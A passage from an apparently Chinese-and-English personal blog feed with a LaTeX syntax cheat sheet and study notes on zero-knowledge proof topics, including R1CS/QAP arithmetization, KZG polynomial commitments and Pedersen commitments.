        <content type="html"><![CDATA[<h1 id="资料">资料</h1><h2 id="理论资料">理论资料</h2><p><ahref="https://github.com/zyw271828/wahzw-zh-cn">zyw271828/wahzw-zh-cn:Why and How zk-SNARK Works 简体中文版</a></p><p><ahref="https://crypto.stanford.edu/~saba/slides/Quals.pdf">Quals.pdf</a></p><h2 id="代码资料">代码资料</h2><ol type="1"><li><p><a href="https://github.com/GarryFCR/Rsa_Zkp">Golang:GarryFCR/Rsa_Zkp: An Efficient and Privacy preserving implementation forthe Set membership problem using Rsa Accumulators coupled withCommit-Prove-Snark</a></p></li><li><p>CCF-B 2023 Paper: Validating the integrity of ConvolutionalNeural Network predictions based on zero-knowledge proof</p><p><ahref="https://github.com/Data-Security-Research-Lab/CNN-prediction-ZKP-scheme/tree/master">Code:Data-Security-Research-Lab/CNN-prediction-ZKP-scheme: The codecorresponds to the paper “Validating the integrity of ConvolutionalNeural Network predictions based on Zero-Knowledge Proof“</a></p></li><li><p>TDSC2023: zk-AuthFeed: Protecting Data Feed to Smart Contractswith Authenticated Zero Knowledge Proof <ahref="https://github.com/wanzhiguo/libsnark-zkauthfeed">wanzhiguo/libsnark-zkauthfeed:libsnark: a C++ library for zkSNARK proofs [+ interface forjsnark/Pinocchio ]</a></p></li></ol><h2 id="主题型">主题型</h2><p><ahref="https://github.com/worldcoin/awesome-zkml">worldcoin/awesome-zkml：awesome-zkml存储库</a></p><p><ahref="https://github.com/LeastAuthority/moonmath-manual">LeastAuthority/moonmath-manual：为任何有兴趣了解和释放zk-SNARK 潜力的人（从初学者到专家）提供的资源。</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用 LaTeX 语法总结</title>
      <link href="/blog/2023/04/16/misc/latex/latex_grammars/"/>
      <url>/blog/2023/04/16/misc/latex/latex_grammars/</url>
      
        <content type="html"><![CDATA[<p>本文总结自己验证过的 LaTeX 语法，逐渐积累更新，使用方式：Ctrl+F搜索关键字，直接拿过来用</p><h2 id="去哪里找-latex-模板或者代码">去哪里找 LaTeX 模板或者代码？</h2><ol type="1"><li>Overleaf 的教程找伪代码,图片之类的代码模版</li><li>Overleaf template 找 poster，cv 等 各种优质模板</li><li><a href="https://www.latexstudio.net">LaTeXStudio</a></li></ol><h2 id="画图">画图</h2><p><ahref="https://blog.csdn.net/a6822342/article/details/80533135">Latex中插入多张图片，实现并排排列或者多行多列排列_泽米的博客-CSDN 博客_tex多张图并列画图</a></p><h2 id="调整图片大小">调整图片大小</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\includegraphics[width=15cm, height=6cm, keepaspectratio]&#123;name1&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\includegraphics[width=\textwidth, height=\textheight]&#123;figure.pdf&#125;)</span><br></pre></td></tr></table></figure><p>Use the scale=1.5 option in the \includegraphics command to resizethe image to 150% of its original size. That is, </p><p><code>keepaspectratio</code>:保持比例不变，一般调整长宽之一，然后让它自适应调整 --- [width=0.3,keepaspectratio,angle=0] this will control the size of the figure,change the fraction to your desired one. say 0.25, if do not wanna keepthe aspect ration same, use "height = 0.5 cm" like setting. you canchange the angular position as well.</p><p><code>\includegraphics[width=10cm,height=10cm,keepaspectratio]&#123;image.png&#125;</code></p><h2 id="latex-跨文件引用">latex 跨文件引用</h2><p>设定公式初始值： 在要设置的 eqation前面，写：<code>\setcounter&#123;equation&#125;&#123;66&#125;</code>，即从 66 开始作为 0初始值。</p><p>在引用的文件里加上被引用的外部文件名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\usepackage&#123;xr&#125;</span><br><span class="line">\externaldocument&#123;article1&#125;</span><br></pre></td></tr></table></figure><h2id="package-caption-warning-unsupported-document-class-or-package-detected">Packagecaption Warning: Unsupported document class (or package) detected</h2><p>在使用 IEEEtrans 模板时发现的报错，因为 IEEEtrans 模板重新定义了caption 的格式，而我由于使用了 subfig 这个包，因此会覆盖掉 IEEE的定义，因此，在 usepackage 时禁用掉 caption 定义就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\usepackage[caption=false]&#123;subfig&#125;</span><br></pre></td></tr></table></figure><p>参考： <ahref="https://tex.stackexchange.com/questions/277333/begin-equation-numbering-with-specific-number">counters- Begin equation numbering with specific number - TeX - LaTeX StackExchange</a></p><p><ahref="https://www.overleaf.com/learn/how-to/Cross_referencing_with_the_xr_package_in_Overleaf#How_to_use_xr_on_Overleaf">Crossreferencing with the xr package in Overleaf - Overleaf, Online LaTeXEditor</a></p><h2 id="table">table</h2><p>直接使用网页上的 LaTeX table generator 解决问题</p><ol type="1"><li><p>末尾加 <code>\hline</code> 是横线</p></li><li><p><code>\begin&#123;tabular&#125;&#123;ccc&#125;</code> 是每栏居中，<code>\begin&#123;tabular&#125;&#123;|c|c|c|&#125;</code> 竖杠对应列的竖线</p></li><li><p>加粗线</p></li></ol><p><code>\usepackage&#123;makecell&#125;</code> and use<code>\Xhline&#123;2\arrayrulewidth&#125;</code> instead of<code>\hline</code></p><ol start="4" type="1"><li>调整列表行距</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;table&#125;</span><br><span class="line">\renewcommand\arraystretch&#123;2&#125;         %表格内部 2 倍行距离</span><br></pre></td></tr></table></figure><p>我的表列数比较多，双栏时放不下。可以将左边距设置小一点，类似调行距那个：</p><p><code>\renewcommand&#123;\arraystretch&#125;&#123;1.3&#125;%调行距</code></p><p><code>\setlength\tabcolsep&#123;3pt&#125;%调列距</code></p><p>参考 <a href="http://www.52yfjc.com/2014/show.asp?id=979">LaTex技巧[43]：Latex 如何调整表格的行距-远方教程</a></p><h2 id="注意在-latex-.bib-中注释-的句子是不管用的"><strong>注意在 latex.bib 中注释 @ 的句子是不管用的</strong></h2><p>@ 应该是特殊字符，注释不管用，会报错 bib 格式不对。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">% article&#123;RS_1960,</span><br><span class="line">%   title     = &#123;Polynomial codes over certain finite fields&#125;,</span><br><span class="line">%   author    = &#123;Reed, Irving S and Solomon, Gustave&#125;,</span><br><span class="line">%   journal   = &#123;Journal of the society for industrial and applied mathematics&#125;,</span><br><span class="line">%   volume    = &#123;8&#125;,</span><br><span class="line">%   number    = &#123;2&#125;,</span><br><span class="line">%   pages     = &#123;300--304&#125;,</span><br><span class="line">%   year      = &#123;1960&#125;,</span><br><span class="line">%   publisher = &#123;SIAM&#125;</span><br><span class="line">% &#125;</span><br></pre></td></tr></table></figure><h2 id="latex-表格加注释">latex 表格加注释</h2><p><a href="https://www.ivdone.cn/article/454.html">latex如何在表格下面加入注释或者标注</a></p><h2 id="参考">参考</h2><p><a href="http://www.52yfjc.com/2014/show.asp?id=979">LaTex技巧[43]：Latex 如何调整表格的行距-远方教程</a></p><h2 id="公式">公式</h2><h3 id="公式对齐">公式对齐</h3><ul><li><code>align</code> outside the math mode</li><li><code>aligned</code> inside the math mode,注意在在 <spanclass="math display">\[\begin{equation}\end{equation}\]</span> 之间用<code>aligned</code>， markdown 中</li><li><code>&amp;</code> 放在要对齐的位置</li></ul><p>调整公式之间间距以及公式与上下文字间距：<code>\vspace&#123;1cm&#125;</code>，[1cm]填写的数字可正可负。</p><h2 id="数学符号">数学符号</h2><h3 id="带广播的矩阵与向量元素相乘">带广播的矩阵与向量元素相乘</h3><p>The elementwise/Hadamard product (∘) and the all-ones vector 𝟷 can beused to write your product as</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/hadamard_latex.jpg"alt="hadamard_latex" /> 或者 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/diag_dot_latex.jpg"alt="diag_dot_latex" /></p><h3 id="参考-1">参考</h3><ol type="1"><li><p><ahref="https://math.stackexchange.com/questions/3274790/notation-for-element-wise-multiplication-of-vector-and-matrix-columns">matrices- Notation for element-wise multiplication of vector and matrix columns- Mathematics Stack Exchange</a></p></li><li><p><ahref="https://math.stackexchange.com/questions/2686188/gradient-of-broadcast-plus">matrices- Gradient of broadcast plus - Mathematics Stack Exchange</a></p></li></ol><h2 id="省略号">省略号</h2><p>和 是低位置省略号 Low dots 和中心位置省略号 centered dots 的 latex命令, 是 amsmath 命令用来试图帮你在 和 中自动做决断的。</p><p>通常来讲中心省略 一般用在数学模式的中心线上的符号后面，例如加号 +或者右箭头 -&gt; , 而 一般用在标点符号的后面，例如句号“ .” or 逗号“,”。</p><h2 id="algorithm-中的">algorithm 中的 </h2><p><code>\gets</code> 操作符的两个操作数需要要位于 <code>$$</code>之中，而且该 <code>$$</code> 之中是公式环境，不需要再写<code>$</code>:</p><p><code>\STATE $ftrusted_i \gets ReliabilityCheck(&#123;\tilde&#123;W&#125;_&#123;i&#125;^&#123;t&#125;&#125;,BC)$</code></p><h2 id="for-循环-if-判断后面加可见注释">for 循环, if判断后面加可见注释</h2><p>例如需要在 for 循环后注释 <code>in parallel</code> 的文字:<code>\FOR[\textbf&#123;in parallel&#125;]&#123;worker $i = 1, \cdots, N$&#125;</code></p>注意加最后的逗点时不要加到 for 循环，if 判断等的后面，会报错 miss<h1 id="latex-add-section-bookmark-for-pdf">Latex add section bookmarkfor pdf</h1><p>实现如下：在导言区中加入以下的一行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\usepackage[breaklinks,colorlinks,linkcolor=black,citecolor=black,urlcolor=black]&#123;hyperref&#125;</span><br></pre></td></tr></table></figure><p>hyperref中各参数的作用参考以下链接:https://wenku.baidu.com/view/c73c48427cd184254b353572.html</p><h2 id="latex-对-replt-letter-加颜色">LaTex 对 Replt letter 加颜色</h2><h3 id="latex-对文字加颜色">LaTeX 对文字加颜色</h3><p><code>\textcolor&#123;red&#125;&#123;text&#125;</code> 注意包裹的 text需要是一段文字不能换行。</p><h3 id="latex-对-table-加颜色">LaTeX 对 Table 加颜色</h3><p>在 caption 前面加 便是 blue 色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\color&#123;blue&#125;</span><br><span class="line">\caption&#123;Notations of Model Verification Mechanism&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arithmetization</title>
      <link href="/blog/2023/04/06/crypto/zk/11.arithmetization/"/>
      <url>/blog/2023/04/06/crypto/zk/11.arithmetization/</url>
      
        <content type="html"><![CDATA[<h1 id="arithmetization">Arithmetization</h1><p>The structure of zk: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/zk_struct.png"alt="zk_struct" /></p><p>The goal of arithmetizations is reduce the computation to singlepolynomial identity.</p><p>Two common arithmetizations</p><h2 id="r1cs---qap">R1CS -&gt; QAP</h2><p>R1CS (rank 1 constraint system) is equivalent to QAP (Quadraticarithmetic program). The circom is complied to R1CS.</p><p>Any computation expressed in the R1CS system we want to check itscorrectness using a single polynomial identity.</p><p>An R1CS is a conjunction of constraints, each of the form:<code>(a DOT x) * (b DOT x) = (c DOT x)</code></p><p>R1CS -&gt; QAP: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/r1cs.png"alt="R1CS" /></p><p>Many problems in Symbolic Computation and cryptography can beexpressed as the task of <strong>computing somepolynomials</strong>.</p><blockquote><p>In computational complexity theory, arithmetic circuits are thestandard model for computing polynomials. - wikepedia</p></blockquote><p>The details of R1CS can be seen in the two following post. Highlyrecommend the first post begin with the introduction of arithmeticcircuit and constraint system, and then dive into the R1CS from shallowto deep.</p><ol type="1"><li><ahref="https://tlu.tarilabs.com/cryptography/rank-1#from-arithmetic-circuits-to-programmable-constraint-systems-for-bulletproofs">Rank-1Constraint System with Application to Bulletproofs</a></li><li><ahref="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">QuadraticArithmetic Programs: from Zero to Hero | by Vitalik Buterin |Medium</a></li></ol><h2 id="air">AIR</h2><p>AIR (Algebraic intermediate representation) --pre-processing--&gt;PAIR --verifier's randomness--&gt; RAP</p><p>RAP is the arithmetization method used by PLONK</p><h2 id="references">References</h2>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>polynomial commitment and KZG commitment</title>
      <link href="/blog/2023/04/03/crypto/zk/10.kzg_commit/"/>
      <url>/blog/2023/04/03/crypto/zk/10.kzg_commit/</url>
      
        <content type="html"><![CDATA[<h1 id="polynomial-commitment-and-kzg-commitment">polynomial commitmentand KZG commitment</h1><p>Merkle tree commitment:</p><ol type="1"><li>commitment = root hash (For SHA256, 32 bytes)</li><li>Proof: <span class="math inline">\(log(n)\)</span> proof size</li><li>Application: state trie / Merkle Patricia Trie</li></ol><p>KZG commitment:</p><ol type="1"><li>commitment = 48 bytes (a Jacobian elliptic curve point)</li><li>Proof: 48 bytes (no matter <span class="math inline">\(n\)</span>is)</li><li>Multi-point proof/batch proof <spanclass="math inline">\(y_{i(0)},y_{i(1)},\cdots, y_{i(m-1)}\)</span>: 48bytes (no matter <span class="math inline">\(n\)</span> is)</li><li>Multi-polynomial commitment、proof aggregation</li><li>Application: Stateless (Verkle tree), DAS (data availabilitysampling)</li></ol><h2 id="overall-procedures-of-kzg">Overall procedures of KZG</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Knowledge -&gt;（Point-Values -&gt;) Coefficients -&gt; Commitment -&gt; Open&amp;Prove&amp;Verify</span><br><span class="line">                          FFT            MSM</span><br><span class="line">                                          ^</span><br><span class="line">                                          |</span><br><span class="line">                                    Trusted Setup</span><br></pre></td></tr></table></figure><h2 id="encode-data-into-polynomial">Encode data into Polynomial</h2><p>Give <span class="math inline">\((x_i, y_i)\)</span>, <spanclass="math inline">\(x_i \ne x_j \forall i \ne j\)</span>, there aretwo way to encode the data into the polynomial.</p><ol type="1"><li><p>If the <span class="math inline">\(x_i\)</span> is just indiceswithout other sense, then only data is valuable. The data can beconverted into integers and treated as the coefficients of thepolynomial.</p></li><li><p>Regardless of whether <span class="math inline">\(x_i\)</span> isa sequential index, whether it stores information or not, these pointscan be treated as the point-value representation of the polynomials. TheInverse FFT can be used to convert the point-value representation tocoefficient representation.</p></li></ol><p>Normally, the binary or integer data are encoded into a finite field<span class="math inline">\(\mathbb{F}_q\)</span>, q is a prime suchthat {0, 1, 2, , q-1} modulo q.</p><blockquote><p>a finite field is a set on which the operations of multiplication,addition, subtraction and division are defined and satisfy certain basicrules. -- wikipedia</p></blockquote><p>Elliptic curve groups are additive groups; that is, their basicfunction is addition. When it comes to the multiplication of curvepoints, the pairing is introduced.</p><h2 id="polynomial-on-elliptic-curve">Polynomial on Elliptic curve</h2><p>Elliptic curve <span class="math inline">\(\mathbb{G_1} = [0, G_1,G_1+G_1 = [2]G_2, \cdots, [q]G_1]\)</span>, where <spanclass="math inline">\([q+1]G_1=0\)</span></p><p><span class="math inline">\([f(x)]G_1 = [\sum_{i=0}^n a_i x^i]G_1 =\sum_{i=0}^n a_i ([x_iG_1]) = \sum_{i=0}^n a_i [x_i]_1\)</span></p><h2 id="polynomial-commitment-with-trusted-setup">Polynomial Commitmentwith Trusted Setup</h2><p>a secret <span class="math inline">\(s \in F_q\)</span> can begenerates, such that</p><ol type="1"><li>nobody knows the <span class="math inline">\(s\)</span> (private keyof 'god')</li><li><span class="math inline">\([s^i]G_1=[s^i]_1, i=1, \cdots\)</span>and <span class="math inline">\([s^i]G_2=[s^i]_2, j=1, \cdots\)</span>is known to everybody. (public key of 'god')</li><li>Benefiting from the discrete log problem of the Elliptic curve, noone can recover <span class="math inline">\(s_i\)</span> though <spanclass="math inline">\([s^i]_1 or [s^i]_2\)</span></li></ol><p>If you are familiar with the secret key in EDCSA signature, that'sit. The <span class="math inline">\([s^i]G_i, [s^i]G_2\)</span> can beseen as the public key.</p><p>Nowdays, popular way to generate <spanclass="math inline">\(s\)</span> is MPC. Besides, Ethereum is doing KZGceremony, <ahref="https://github.com/ethereum/kzg-ceremony-specs">ethereum/kzg-ceremony-specs:Specs for Ethereum's KZG Powers of Tau Ceremony</a>. The degree of <spanclass="math inline">\(G_2\)</span> is significantly smaller than <spanclass="math inline">\(G_1\)</span>. Therefore, in pairings, the highdegree part should match with <span class="math inline">\(G_1\)</span>and the low degree part with $G_2".</p><p><strong>Commitment</strong>: <span class="math inline">\(Com =[f(s)]_1 = \sum_{i=0}^n [a_i s_i]G_1 = \sum_{i=0}^n a_i[s_i]_1\)</span>, where Com is actually a point on the ellipticcurve.</p><blockquote><p>From the Schwartz-Zippel Lemma, finding a random <spanclass="math inline">\(x_0\)</span> such that the probability of <spanclass="math inline">\(F(x_0) = f(s)\)</span> is impossible.</p></blockquote><h2 id="single-proof">Single proof</h2><p>Given <span class="math inline">\(x_i\)</span>, we want to prove thecomputing result <span class="math inline">\(y_i = f(x_i)\)</span>,</p><p><span class="math display">\[\begin{equation}\begin{aligned}        &amp;f(x) - y_i = q(x)(x - x_i) \\        &amp;q(x) = \frac{f(x)-y_0}{x-x_0}\end{aligned}\end{equation}\]</span></p><p>Let's integrate the formula with an elliptic curve,</p><p><span class="math display">\[\begin{equation}\begin{aligned}    [f(x) - y_i] G_1 &amp;= [q(x)(x - x_i)] G_1 \\    [f(x)]_1 - [y_i]_1 &amp;= ?\end{aligned}\end{equation}\]</span></p><p>However, <span class="math inline">\(q(x) x G_1- q(x) x_iG_1\)</span> cannot be evaluated at coordinate <spanclass="math inline">\(x=s\)</span> without knowing <spanclass="math inline">\(s\)</span>. To solve the problem, <spanclass="math inline">\(q(x)\)</span> and <span class="math inline">\(x -x_i\)</span> need to be split into multiplication. While the pairingallows to "multiply" the exponents of two group elements, while theusual group structure only allows adding or subtracting exponents</p><p>So let pairing, <span class="math inline">\(e: \mathbb{G_1} \times\mathbb{G_2} \rightarrow \mathbb{G_T}\)</span></p><p><span class="math display">\[\begin{equation}\begin{aligned}    [f(s) - y_i] G_1 G_2 &amp;= [q(s)(s - x_i)] G_1 G_2 \\    e([f(s) - y_i] G_1, G_2) &amp;= e(q(s)G_1, (s - x_i)G_2) \\    e([f(s)]_1 - [y_i]_1, G_2) &amp;= e([q(s)]_1, [s]_2 - [x_i]_2) \\    e(Com - [y_i]_1, G_2) &amp;= e([q(s)]_1, [s]_2 - [x_i]_2),\end{aligned}\end{equation}\]</span></p><p>where <span class="math inline">\(q(s)_1\)</span> is the<strong>proof</strong> (48 bytes as a point on an elliptic curve).</p><p>Great, the above all can be calculated without <spanclass="math inline">\(s\)</span>.</p><p>Note: Not all curve can do pairing, G1 and G2 ispairing-friendly.</p><p>For multi-proof, assume that you have an interpolation polynomialI(X) such that <span class="math inline">\(I(x_i) = y_i\)</span>, where<span class="math inline">\((x_i,y_i)\)</span> is a list of evaluationpoints.</p><p><span class="math display">\[q(x) = \frac{f(x)-I(x)}{\prod{(x-x_i)}}\]</span></p><h2 id="polynomial-commitment-的其他实现">Polynomial Commitment的其他实现</h2><ol type="1"><li>KZG：PLONK、Marlin</li><li>FRI：zkSTARK</li><li>IPA：Bulletproof</li><li>IPA + Halo-style aggregation：Halo 2</li></ol><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/poly_commits.png"alt="polynomial commitments" /><figcaption aria-hidden="true">polynomial commitments</figcaption></figure><ol start="3" type="1"><li>KZG Commitment 的优缺点<ol type="1"><li>缺点：需要 Trusted Setup</li><li>优点：proof 长度短且恒定</li></ol></li></ol><h2 id="todo">TODO</h2><p><a href="https://vitalik.ca/general/2021/06/18/verkle.html">Verkletrees</a></p><p>后面读一下 kzg 原论文</p><p>多项式承诺计算就是 MSM，MSM 的高效实现 pippenger 算法</p><h2 id="references">References</h2><ol type="1"><li><ahref="https://dankradfeist.de/ethereum/2021/10/13/kate-polynomial-commitments-mandarin.html">RecommendedKZG 多项式承诺 | Dankrad Feist</a></li><li><a href="https://www.youtube.com/watch?v=n4eiiCDhTes">PolynomialCommitment KZG with Examples ( part 1 ) - YouTube</a></li><li><a href="https://scroll.io/blog/kzg">KZG in Practice: PolynomialCommitment Schemes and Their Usage in Scaling Ethereum - Scroll</a></li><li><ahref="https://crypto.stackexchange.com/questions/56400/why-pairings-on-elliptic-curve-are-used">Why"pairings on elliptic curve" are used? - Cryptography StackExchange</a></li><li><a href="https://www.youtube.com/watch?v=nkrk3jLj8Jw">零知识证明 KZGCommitment 1: Polynomial Commitment 20221129 - YouTube</a></li><li><ahref="https://copper-witch-857.notion.site/Polynomial-KZG-or-Kate-Commitment-DappLearning-Notes-fc426c8cb9a14878840852506865f13b">Polynomial(KZG or Kate) Commitment (DappLearning) Notes</a></li><li><ahref="https://blog.subspace.network/kzg-polynomial-commitments-cd64af8ec868">KZGPolynomial Commitments. This article is based on Dankrad… | by OzgunOzerk | Subspace Network</a></li><li>[./media/kzg_exercise_sol.pdf]</li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cryptographic Commitment and pedersen commitment</title>
      <link href="/blog/2023/04/02/crypto/zk/9.pedersen_comm/"/>
      <url>/blog/2023/04/02/crypto/zk/9.pedersen_comm/</url>
      
        <content type="html"><![CDATA[<p>Cryptographic commmitment: emulates an envelope.</p><h2 id="syntax">Syntax</h2><p>a commitment scheme is two algorithms: commit and verify</p><ol type="1"><li><p><code>commit(msg, r) -&gt; com</code></p><p><strong>r</strong>: secret randomness in <strong>R</strong>, alsocalled bliding factor <strong>com</strong> : commitment string</p></li><li><p><code>verify(msg, com, r) -&gt; accept or reject</code></p><p>anyone can verify that commmitment was opened correctly</p></li></ol><h2 id="security-properties">security properties</h2><ol type="1"><li><p>binding: Bob cannot produce two valid openings for<strong>com</strong></p><p>More procisely: no efficient adversary can produce<strong>com</strong>, (m1, r1), (m2, r1), such that verify(m1,<strong>com</strong>, r1) = verify(m2, <strong>com</strong>, r2)=acceptand m1!=m2</p></li><li><p>hiding: <strong>com</strong> reveals nothing about committeddata</p><p>commit(m, r)-&gt;<strong>com</strong>, and r is sampled uniformly in<strong>R</strong>, then <strong>com</strong> is statistically indenpentof <strong>m</strong>.</p></li></ol><h2 id="离散对数假设">离散对数假设</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16640923085899.jpg"alt="discrete log" /><figcaption aria-hidden="true">discrete log</figcaption></figure><p>根据参与方计算能力的不同，承诺方案一般分为两类：schemes withcomputationally hiding, perfect binding and schemes with computationallybinding, perfect hiding</p><h2 id="example-1-hash-based-commitment">Example 1: hash-basedcommitment</h2><p>Fix a hash function: H: M x R-&gt;C (e.g., SHA256), (M:hash space, R:randomness space, C: commitment space), where H is collision resistant,and |R| &gt;&gt; |C|(Randomness space is much large than commitmentspace)</p><ol type="1"><li><p><span class="math display">\[comit(m \in M, r \gets R)\]</span>:<strong>com</strong> = H(m, r)</p><p>sample a random string <strong>r</strong> from set<strong>R</strong></p></li><li><p>verify(m, <strong>com</strong>, r): accpet if com = H(m,r)</p></li><li><p>binding: follows from coll ision resistance of H</p></li><li><p>hiding: follows from a mild assumption on H assume function Hbehaves sort of like a random function, then the fact that therandomness space is so much bigger than the commitment means that giventhe commitment value h(m, r) is actually independent of m</p></li></ol><h2 id="example-2-pedersen-commitment">Example 2: PedersenCommitment</h2><p>Pederson 承诺,于 1992 年被 Pedersen 在 “<ahref="https://link.springer.com/content/pdf/10.1007/3-540-46766-1_9.pdf">Non-Interactiveand Information-Theoretic Secure Verifiable Secret Sharing</a>”一文中提出。</p><blockquote><p>该 paper 的 section 对 Pedersen Commitment讲述极为简洁易懂,可以读读</p></blockquote><p>Pedersen承诺是一个满足完美隐藏、计算绑定的同态承诺协议，其完美隐藏性不依赖与任何困难性假设(randomness&lt;- algebraic hash function)，计算绑定依赖于离散对数假设(DLA).该以指数运算的形式提出(基于离散对数难题), 而目前 Pedersen Commitment主要搭配椭圆曲线密码学使用(基于椭圆曲线的离散对数问题）,具有基于离散对数困难问题的强绑定性和同态加法特性的密文形式。下面分别介绍该承诺的两种形式.</p><h3 id="基于离散对数的-pedersen-commitment">基于离散对数的 PedersenCommitment</h3><p><strong>Core</strong>: The committer commits himself to an <spanclass="math display">\[s \in Z_q\]</span> by choosing <spanclass="math display">\[t \in 2_q\]</span>, at random and computing:<span class="math display">\[com = g^s * h^t\]</span></p><ol type="1"><li><p>初始化阶段 setup:</p><p>选择阶为大素数 q 的乘法群 G, 生成元，<spanclass="math display">\[G=&lt;g&gt;=&lt;h&gt;\]</span>，公开三元组:(g，h，q)；</p><p>chosing a prime-order group <span class="math inline">\(G\)</span> =finite cyclic group = <span class="math display">\[{1, g, g^2, ...,g^{q-1}}\]</span> where <span class="math display">\[g^i * g^j = g^{i+j\mod q}\]</span>(note: element generated by generator is in the group).<span class="math display">\[q = |G|\]</span></p><p>Fix g,h in G and let R = {0, 1, 2, q-1}.</p><p>由于 r 为随机数，Pedersen commitment 具有完美隐藏性（unconditionallyhiding）特性，以及基于离散对数假设的完美隐藏性（computationallybinding）特性。</p></li><li><p>承诺阶段 com</p><p>承诺方选择随机数 r 作为盲因子，计算承诺值，然后发送 com 给接收者；prepare secret value m, choose blinding factor <spanclass="math display">\[r \in R\]</span>, and commmit</p><p><span class="math display">\[commit(m \in R, r \gets R) = H(m, r) =g^m * h^r\]</span></p><p>Fact: For a cryptograpic group G, this H is collision resistant, thiscalled discrete logs problem.</p></li><li><p>打开阶段 open</p><p>承诺方发送 (m，r) 给接收者，接收者验证 com 是否等于 <spanclass="math display">\[H(m, r) = g^m *h^r\]</span>，如果相等则接受，否则拒绝承诺。</p></li></ol><h3 id="homomorphic-property">homomorphic property</h3><p><span class="math display">\[commit(m \in R, r \gets R) = H(m, r) =g^m * h^r\]</span></p><p>Suppose: <span class="math display">\[commit(m1 \in R, r_1 \gets R)\to com_1\]</span> and <span class="math display">\[commit(m2 \in R, r_2\gets R) \to com_2\]</span></p><p>Then <span class="math display">\[com_1 \times com_2 = g^{m_1+m_2}\times h^{r_1+r_2} = commmit(m_1 + m_2, r_1 + r_2)\]</span></p><p>anyone can sum commmited value. This is the homomorphic propertywhich lets you compute uncommited values(m1+m2) without knowing what thecommited values actually are.</p><h3 id="基于椭圆曲线的-pedersen-commitmentt">基于椭圆曲线的 PedersenCommitmentt</h3><p><strong>Core</strong>: <span class="math display">\[C = r * G + m *H\]</span></p><p>上述公式中，C 为生成的承诺值，G、H 为特定椭圆曲线上的生成点，r代表着盲因子（Blinding factor），m 则代表着原始信息。由于 G、H为特定椭圆曲线上的生成点，所以 r _ G、v _ H可以看作是相应曲线上的公钥（r、v 同理也可以视为私钥）。</p><p>由于引入了随机盲因子 r，对于同一个 m 会就能产生不同的承诺c，即便敏感隐私数据 m 不变，最终的承诺 C 也会随着 r的变化而变化，因此提供了信息论安全的隐匿性.</p><p>Commitment C(x, a) ) is information-theoretically private becausethere are many possible combinations of m and r that would output thesame C. If r is truly random, an attacker would have literally no way tofigure out m.</p><h2 id="pedersen-commitment-应用">Pedersen Commitment 应用</h2><ol type="1"><li><p>数值隐藏</p><p>承诺方随机选择 blinding factor, 然后通过构造关于数值 value的承诺.</p></li><li><p>恒等关系验证/隐秘交易</p><p>主要利用其加性同态的特性</p><p>只要第一个数等于后两个数之和，验证者不会看到交易量具体值，但是又不得不承认A 真的分了一部分钱给 B，然后还有一部分钱又退回给了A。这样既隐藏了数据本身，又证明了数据的关系。虽然 Pederson承诺证明了数字之间的关系，但是并没有限制任何数字的取值区间，因此还需要对隐藏的数值进行范围证明！</p><p>ref: USENIX2018: zkLedger</p></li></ol><h2 id="编程参考">编程参考</h2><p><ahref="https://findora.org/faq/crypto/pedersen-commitment-with-elliptic-curves/">Pedersencommitment (with elliptic curves) - Findora</a></p><p>两个 Python 源码(密码学库: PyCryptodome)</p><ol type="1"><li><p><ahref="https://github.com/EraxterCodes/Pedersen-Commitment-using-Elliptic-Curves/blob/main/Pedersen.py">Pedersen-Commitment-using-Elliptic-Curves/Pedersen.pyat main ·EraxterCodes/Pedersen-Commitment-using-Elliptic-Curves</a></p></li><li><p><ahref="https://github.com/lorenzogentile404/pedersen-commitment/blob/master/pedersen-commitment.py">pedersen-commitment/pedersen-commitment.pyat master · lorenzogentile404/pedersen-commitment</a></p></li></ol><h1 id="参考资料">参考资料</h1><ol type="1"><li><ahref="https://link.springer.com/content/pdf/10.1007/3-540-46766-1_9.pdf">Non-Interactiveand Information-Theoretic Secure Verifiable Secret Sharing</a></li><li><a href="https://zhuanlan.zhihu.com/p/108659500">密码学承诺之Pedersen commitment 原理及应用 